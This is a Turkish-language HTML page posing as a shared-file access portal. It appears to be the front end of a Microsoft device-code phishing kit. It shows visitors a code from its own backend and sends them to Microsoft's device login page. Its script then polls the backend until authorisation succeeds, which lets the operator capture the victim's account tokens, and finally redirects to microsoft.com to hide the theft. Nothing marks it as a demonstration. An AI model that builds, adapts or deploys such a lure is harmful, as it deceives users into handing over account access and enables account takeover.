<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dosya Paylaşımı</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
        .box { background: white; padding: 30px; border-radius: 8px; display: inline-block; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); max-width: 400px; width: 90%; }
        .code { font-size: 28px; font-weight: bold; color: #0078d4; margin: 20px 0; letter-spacing: 2px; background: #eee; padding: 10px; border-radius: 5px; }
        .btn { display: inline-block; background: #0078d4; color: white; padding: 12px 20px; text-decoration: none; border-radius: 5px; font-weight: bold; margin-top: 15px; }
        .btn:hover { background: #005a9e; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Paylaşılan Dosyaya Erişim</h2>
        <p>Devam etmek için aşağıdaki kodu kopyalayın ve Microsoft doğrulama sayfasına girin:</p>
        <div class="code" id="userCode">Yükleniyor...</div>
        <p>
            <a id="loginLink" class="btn" href="https://microsoft.com/devicelogin" target="_blank">Doğrulama Sayfasına Git</a>
        </p>
    </div>

    <script>
        async function initFlow() {
            try {
                const res = await fetch('/api/get-code');
                const data = await res.json();

                if (data.user_code && data.device_code) {
                    document.getElementById('userCode').innerText = data.user_code;
                    
                    const interval = setInterval(async () => {
                        const pollRes = await fetch('/api/poll', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                deviceCode: data.device_code, 
                                userCode: data.user_code 
                            })
                        });
                        
                        const pollData = await pollRes.json();
                        
                        if (pollData.success) {
                            clearInterval(interval);
                            window.location.href = 'https://www.microsoft.com'; 
                        }
                    }, 2000);
                } else {
                    document.getElementById('userCode').innerText = 'Kod alınamadı.';
                }
            } catch (err) {
                console.error(err);
                document.getElementById('userCode').innerText = 'Bir hata oluştu.';
            }
        }

        initFlow();
    </script>
</body>
</html>
